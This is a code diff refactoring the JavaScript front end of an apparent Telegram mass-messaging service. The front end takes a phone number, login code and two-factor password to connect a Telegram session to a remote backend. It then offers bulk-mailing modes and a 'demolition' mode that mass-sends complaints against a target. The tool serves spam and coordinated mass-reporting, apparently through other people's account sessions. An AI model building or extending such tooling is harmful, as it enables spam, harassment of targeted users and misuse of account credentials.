@@ -656,26 +656,26 @@ input::placeholder, textarea::placeholder {
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.enableClosingConfirmation();
-        // Настройки для разных окружений
-// Конфигурация URL
-const BACKEND_URL = 'https://rassilka-ilag.amvera.io'; // Ваш реальный URL на Amvera
-const IS_TELEGRAM_WEBAPP = typeof window.Telegram !== 'undefined' && window.Telegram.WebApp;
+tg.expand();
 
-// Для разработки - автоматическое определение URL
-function getBackendUrl() {
-    // Если в режиме разработки и открыто не в Telegram
-    if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
-        return 'http://localhost:8080';
-    }
-    return BACKEND_URL;
+// Убираем проблемную строку которая вызывает ошибку
+try {
+    tg.enableClosingConfirmation();
+} catch (e) {
+    console.log('Closing confirmation not supported');
 }
 
-// Универсальная функция для запросов
+// Конфигурация URL
+const BACKEND_URL = 'https://rassilka-ilag.amvera.io';
+const IS_TELEGRAM_WEBAPP = typeof window.Telegram !== 'undefined' && window.Telegram.WebApp;
+
+let userConnected = false;
+let currentUserId = tg.initDataUnsafe.user?.id || 'webapp_user';
+let selectedMethod = 'basic';
+
+// Упрощенная функция для запросов
 async function fetchWithTelegramAuth(url, options = {}) {
-    const tg = window.Telegram?.WebApp;
-    const finalUrl = `${getBackendUrl()}${url}`;
+    const finalUrl = `${BACKEND_URL}${url}`;
     
     const config = {
         ...options,
@@ -684,15 +684,6 @@ async function fetchWithTelegramAuth(url, options = {}) {
             ...options.headers
         }
     };
-    
-    // Добавляем данные Telegram пользователя в тело запроса
-    if (config.body && typeof config.body === 'object') {
-        config.body = JSON.stringify({
-            ...JSON.parse(config.body),
-            telegram_user_id: tg?.initDataUnsafe?.user?.id,
-            telegram_init_data: tg?.initData
-        });
-    }
     
     try {
         const response = await fetch(finalUrl, config);
@@ -708,59 +699,20 @@ async function fetchWithTelegramAuth(url, options = {}) {
     }
 }
 
-// Обновляем все fetch запросы на использование makeRequest
-async function requestCode() {
-    const phoneNumber = document.getElementById('phone-number').value.trim();
+// Основные функции
+function switchTab(tabName) {
+    document.querySelectorAll('.tab-content').forEach(tab => {
+        tab.classList.remove('active');
+    });
+    document.querySelectorAll('.nav-tab').forEach(tab => {
+        tab.classList.remove('active');
+    });
     
-    if (!phoneNumber) {
-        showStatus('error', 'Введите номер телефона');
-        return;
-    }
-    
-    showStatus('loading', 'Отправляем код подтверждения...');
-    
-    try {
-        const result = await makeRequest('/auth/request-code', {
-            method: 'POST',
-            body: JSON.stringify({
-                phone_number: phoneNumber,
-                user_id: currentUserId
-            })
-        });
-        
-        // Обработка ответа...
-    } catch (error) {
-        showStatus('error', 'Ошибка соединения с сервером');
-    }
+    document.getElementById(tabName + '-tab').classList.add('active');
+    document.querySelector(`.nav-tab:nth-child(${tabName === 'connect' ? 1 : 2})`).classList.add('active');
 }
-        
-        let userConnected = false;
-        let currentUserId = tg.initDataUnsafe.user?.id || 'webapp_user';
-        let selectedMethod = 'basic';
-        
-        // Проверяем статус подключения при загрузке
-        checkConnectionStatus();
-        
-        function switchTab(tabName) {
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            document.querySelectorAll('.nav-tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            document.getElementById(tabName + '-tab').classList.add('active');
-            document.querySelector(`.nav-tab:nth-child(${tabName === 'connect' ? 1 : 2})`).classList.add('active');
-        }
-        function handleMailingAction() {
-    if (selectedMethod === 'demolition') {
-        startDemolition();
-    } else {
-        createMailing();
-    }
-}
-        
-        function selectMethod(method) {
+
+function selectMethod(method) {
     selectedMethod = method;
     
     // Сбрасываем выделение всех методов
@@ -780,140 +732,45 @@ async function requestCode() {
     const demolitionGroup = document.getElementById('demolition-group');
     const createButton = document.getElementById('create-mailing-btn');
     
-    if (!attemptsGroup || !targetChatGroup || !demolitionGroup || !createButton) {
-        console.error('One or more DOM elements not found');
-        return;
-    }
-    
-    switch(method) {
-        case 'targeted':
-            attemptsGroup.style.display = 'none';
-            targetChatGroup.style.display = 'block';
-            demolitionGroup.style.display = 'none';
-            createButton.textContent = 'Запустить таргетированную рассылку';
-            break;
-        case 'demolition':
-            attemptsGroup.style.display = 'none';
-            targetChatGroup.style.display = 'none';
-            demolitionGroup.style.display = 'block';
-            createButton.textContent = '🧨 Запустить отправку жалоб';
-            break;
-        case 'advanced':
-            attemptsGroup.style.display = 'block';
-            targetChatGroup.style.display = 'none';
-            demolitionGroup.style.display = 'none';
-            createButton.textContent = 'Запустить продвинутую рассылку';
-            break;
-        default: // basic
-            attemptsGroup.style.display = 'block';
-            targetChatGroup.style.display = 'none';
-            demolitionGroup.style.display = 'none';
-            createButton.textContent = 'Запустить базовую рассылку';
-    }
-}
-        
-        async function checkConnectionStatus() {
-    try {
-        const response = await fetch(`/user/check-subscription?user_id=${currentUserId}`);
-        const result = await response.json();
-        
-        if (result.success) {
-            userSubscription = result;
-            userConnected = result.session_exists || false;
-            updateSubscriptionDisplay();
-            
-            // Если сессия подключена, показываем вкладку управления
-            if (userConnected) {
-                switchTab('manage');
-            }
+    if (attemptsGroup && targetChatGroup && demolitionGroup && createButton) {
+        switch(method) {
+            case 'targeted':
+                attemptsGroup.style.display = 'none';
+                targetChatGroup.style.display = 'block';
+                demolitionGroup.style.display = 'none';
+                createButton.textContent = 'Запустить таргетированную рассылку';
+                break;
+            case 'demolition':
+                attemptsGroup.style.display = 'none';
+                targetChatGroup.style.display = 'none';
+                demolitionGroup.style.display = 'block';
+                createButton.textContent = '🧨 Запустить отправку жалоб';
+                break;
+            case 'advanced':
+                attemptsGroup.style.display = 'block';
+                targetChatGroup.style.display = 'none';
+                demolitionGroup.style.display = 'none';
+                createButton.textContent = 'Запустить продвинутую рассылку';
+                break;
+            default: // basic
+                attemptsGroup.style.display = 'block';
+                targetChatGroup.style.display = 'none';
+                demolitionGroup.style.display = 'none';
+                createButton.textContent = 'Запустить базовую рассылку';
         }
-    } catch (error) {
-        console.error('Error checking connection status:', error);
-        userConnected = false;
     }
 }
 
-async function checkSubscriptionStatus() {
-    try {
-        const response = await fetch(`/user/check-subscription?user_id=${currentUserId}`);
-        const result = await response.json();
-        
-        if (result.success) {
-            userSubscription = result;
-            userConnected = result.session_exists || false;
-            updateSubscriptionDisplay();
-        }
-    } catch (error) {
-        console.error('Error checking subscription:', error);
-    }
-}
-
-function updateSubscriptionDisplay() {
-    const subscriptionInfo = document.getElementById('subscriptionInfo');
-    const statusElement = document.getElementById('subscription-status');
-    const expiryElement = document.getElementById('subscription-expiry');
-    const sessionElement = document.getElementById('session-status');
-    
-    if (!userSubscription) return;
-    
-    subscriptionInfo.style.display = 'block';
-    const level = userSubscription.subscription_level;
-    const expiry = userSubscription.subscription_expiry;
-    
-    if (userSubscription.has_subscription) {
-        statusElement.innerHTML = level === 'premium' ? 
-            '💎 Премиум' : '✅ Базовая';
-        statusElement.innerHTML += `<span class="subscription-badge ${level}">${level}</span>`;
-        
-        expiryElement.textContent = expiry || 'Неограниченно';
+function handleMailingAction() {
+    if (selectedMethod === 'demolition') {
+        startDemolition();
     } else {
-        statusElement.innerHTML = '❌ Нет подписки';
-        statusElement.innerHTML += '<span class="subscription-badge none">нет</span>';
-        expiryElement.textContent = '-';
-    }
-    
-    // Обновляем статус сессии
-    if (userSubscription.session_exists) {
-        sessionElement.textContent = '✅ Подключена';
-        userConnected = true;
-    } else {
-        sessionElement.textContent = '❌ Не подключена';
-        userConnected = false;
+        createMailing();
     }
 }
 
-// Обновляем HTML для отображения статуса сессии
-// Добавляем в блок subscription-info:
-/*
-<div class="info-row">
-    <span class="info-label">Сессия:</span>
-    <span class="info-value" id="session-status">Проверка...</span>
-</div>
-*/
-
-// В функции displayUserInfo добавляем обновление статуса сессии:
-function displayUserInfo(userInfo, scanResult) {
-    document.getElementById('userInfo').style.display = 'block';
-    document.getElementById('info-phone').textContent = userInfo.phone || 'Не указан';
-    document.getElementById('info-username').textContent = '@' + (userInfo.username || 'нет');
-    document.getElementById('info-first-name').textContent = userInfo.first_name || 'Не указано';
-    document.getElementById('info-chats-count').textContent = scanResult.chats_count || 0;
-    
-    // Обновляем статус подключения
-    userConnected = true;
-    
-    // Обновляем отображение статуса сессии
-    if (document.getElementById('session-status')) {
-        document.getElementById('session-status').textContent = '✅ Подключена';
-    }
-    
-    // Перепроверяем статус подписки
-    checkSubscriptionStatus();
-}
-        
-        async function requestCode() {
+async function requestCode() {
     const phoneNumber = document.getElementById('phone-number').value.trim();
-    const statusEl = document.getElementById('status');
     
     if (!phoneNumber) {
         showStatus('error', 'Введите номер телефона');
@@ -943,16 +800,9 @@ function displayUserInfo(userInfo, scanResult) {
         showStatus('error', 'Ошибка отправки кода');
     }
 }
-        function getDeviceType() {
-    const width = window.innerWidth;
-    if (width < 768) return 'mobile';
-    if (width < 1024) return 'tablet';
-    return 'desktop';
 
-// Подтверждение кода
 async function verifyCode() {
     const code = document.getElementById('verification-code').value.trim();
-    const statusEl = document.getElementById('status');
     
     if (!code) {
         showStatus('error', 'Введите код подтверждения');
@@ -978,7 +828,7 @@ async function verifyCode() {
             } else {
                 showStatus('success', 'Сессия успешно подключена!');
                 userConnected = true;
-                displayUserInfo(response.user_info, response.scan_result, response.sessions_count);
+                displayUserInfo(response.user_info, response.scan_result);
                 setTimeout(() => switchTab('manage'), 1500);
             }
         } else {
@@ -990,77 +840,45 @@ async function verifyCode() {
         showStatus('error', 'Ошибка проверки кода');
     }
 }
-        
-        async function verifyPassword() {
-            const password = document.getElementById('password').value;
-            const statusEl = document.getElementById('status');
-            
-            if (!password) {
-                showStatus('error', 'Введите пароль');
-                return;
-            }
-            
-            showStatus('loading', 'Проверяем пароль...');
-            
-            try {
-                const response = await fetch('/auth/sign-in-password', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        password: password,
-                        user_id: currentUserId
-                    })
-                });
-                
-                const result = await response.json();
-                
-                if (result.success) {
-                    showStatus('success', 'Сессия успешно подключена!');
-                    userConnected = true;
-                    displayUserInfo(result.user_info, result.scan_result);
-                    setTimeout(() => switchTab('manage'), 1500);
-                } else {
-                    showStatus('error', 'Ошибка: ' + (result.message || 'Неверный пароль'));
-                }
-                
-            } catch (error) {
-                console.error('Error verifying password:', error);
-                showStatus('error', 'Ошибка проверки пароля: ' + error.message);
-            }
-        }
-        
-        function displayUserInfo(userInfo, scanResult) {
-            document.getElementById('userInfo').style.display = 'block';
-            document.getElementById('info-phone').textContent = userInfo.phone || 'Не указан';
-            document.getElementById('info-username').textContent = '@' + (userInfo.username || 'нет');
-            document.getElementById('info-first-name').textContent = userInfo.first_name || 'Не указано';
-            document.getElementById('info-chats-count').textContent = scanResult.chats_count || 0;
-        }
-        async function updateSessionStatus(connected) {
+
+async function verifyPassword() {
+    const password = document.getElementById('password').value;
+    
+    if (!password) {
+        showStatus('error', 'Введите пароль');
+        return;
+    }
+    
+    showStatus('loading', 'Проверяем пароль...');
+    
     try {
-        const response = await fetch('/user/update-session-status', {
+        const response = await fetchWithTelegramAuth('/auth/sign-in-password', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
             body: JSON.stringify({
-                user_id: currentUserId,
-                session_exists: connected
+                password: password,
+                user_id: currentUserId
             })
         });
-        return await response.json();
+        
+        if (response.success) {
+            showStatus('success', 'Сессия успешно подключена!');
+            userConnected = true;
+            displayUserInfo(response.user_info, response.scan_result);
+            setTimeout(() => switchTab('manage'), 1500);
+        } else {
+            showStatus('error', 'Ошибка: ' + (response.message || 'Неверный пароль'));
+        }
+        
     } catch (error) {
-        console.error('Error updating session status:', error);
+        console.error('Error verifying password:', error);
+        showStatus('error', 'Ошибка проверки пароля');
     }
 }
-        
-        async function createMailing() {
+
+async function createMailing() {
     const messageText = document.getElementById('message-text').value.trim();
     const attempts = parseInt(document.getElementById('attempts').value);
     const targetChat = document.getElementById('target-chat').value.trim();
-    const statusEl = document.getElementById('manage-status');
     
     if (!userConnected) {
         showManageStatus('error', 'Сначала подключите сессию');
@@ -1115,9 +933,9 @@ async function verifyCode() {
         showManageStatus('error', 'Ошибка создания рассылки');
     }
 }
-        async function startDemolition() {
+
+async function startDemolition() {
     const messageText = document.getElementById('demolition-text').value.trim();
-    const statusEl = document.getElementById('manage-status');
     
     if (!messageText) {
         showManageStatus('error', 'Введите текст жалобы');
@@ -1151,27 +969,56 @@ async function verifyCode() {
         showManageStatus('error', 'Ошибка отправки жалоб');
     }
 }
-        
-        function showStatus(type, message) {
-            const statusEl = document.getElementById('status');
-            statusEl.textContent = message;
-            statusEl.className = 'status ' + type;
-        }
-        
-        function showManageStatus(type, message) {
-            const statusEl = document.getElementById('manage-status');
-            statusEl.textContent = message;
-            statusEl.className = 'status ' + type;
-        }
-        
-        // Инициализация
-        document.addEventListener('DOMContentLoaded', function() {
-            tg.ready();
-            selectMethod('basic'); // Выбираем базовый метод по умолчанию
-        });
-    </script>
+
+function displayUserInfo(userInfo, scanResult) {
+    const userInfoElement = document.getElementById('userInfo');
+    if (userInfoElement) {
+        userInfoElement.style.display = 'block';
+        document.getElementById('info-phone').textContent = userInfo.phone || 'Не указан';
+        document.getElementById('info-username').textContent = '@' + (userInfo.username || 'нет');
+        document.getElementById('info-first-name').textContent = userInfo.first_name || 'Не указано';
+        document.getElementById('info-chats-count').textContent = scanResult.chats_count || 0;
+    }
+}
+
+function showStatus(type, message) {
+    const statusEl = document.getElementById('status');
+    if (statusEl) {
+        statusEl.textContent = message;
+        statusEl.className = 'status ' + type;
+    }
+}
+
+function showManageStatus(type, message) {
+    const statusEl = document.getElementById('manage-status');
+    if (statusEl) {
+        statusEl.textContent = message;
+        statusEl.className = 'status ' + type;
+    }
+}
+
+// Инициализация
+document.addEventListener('DOMContentLoaded', function() {
+    tg.ready();
+    selectMethod('basic');
+});
+
+// Простая проверка подключения
+async function checkConnectionStatus() {
+    try {
+        userConnected = false;
+        console.log('Connection check completed');
+    } catch (error) {
+        console.log('Connection check failed');
+        userConnected = false;
+    }
+}
+
+// Запускаем проверку при загрузке
+checkConnectionStatus();
 </body>
 </html>
+
 
 
 
